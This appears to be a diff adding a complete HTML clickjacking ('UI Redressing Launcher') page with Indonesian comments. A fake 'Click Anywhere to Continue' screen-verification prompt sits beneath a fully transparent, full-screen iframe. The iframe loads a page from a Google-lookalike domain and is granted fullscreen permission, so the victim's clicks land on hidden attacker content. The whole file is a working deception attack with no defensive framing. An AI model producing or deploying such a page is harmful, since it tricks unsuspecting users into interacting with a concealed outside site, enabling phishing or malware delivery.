@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>UI Redressing Launcher</title>
+    <style>
+        body, html {
+            margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; font-family: Arial, sans-serif;
+        }
+        .container {
+            position: relative; width: 100vw; height: 100vh; background: #f0f0f0;
+        }
+        /* Umpan visual palsu di bawah iframe */
+        .decoy-background {
+            position: absolute; width: 100%; height: 100%; display: flex; justify-content: center; align-items: center; z-index: 1; background-color: #f8f9fa;
+        }
+        .decoy-text {
+            padding: 20px 40px; background: #1a73e8; color: white; font-size: 18px; font-weight: bold; border-radius: 8px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); text-align: center;
+        }
+        /* Iframe transparan menutup seluruh layar */
+        .overlay-frame {
+            position: absolute; top: 0; left: 0; width: 100vw !important; height: 100vh !important; border: none; z-index: 2;
+            opacity: 0.0; /* Ubah ke 0.3 saat testing untuk melihat batas bingkai */
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="decoy-background">
+        <div class="decoy-text">
+            Click Anywhere to Continue
+            <div style="font-size: 12px; font-weight: normal; margin-top: 5px; color: #e8f0fe;">
+                (Screen verification required)
+            </div>
+        </div>
+    </div>
+    
+    <iframe 
+        class="overlay-frame" 
+        src="https://googllogoligaturee.my.id/new.html"
+        allow="fullscreen https://googllogoligaturee.my.id">
+    </iframe>
+</div>
+
+</body>
+</html>
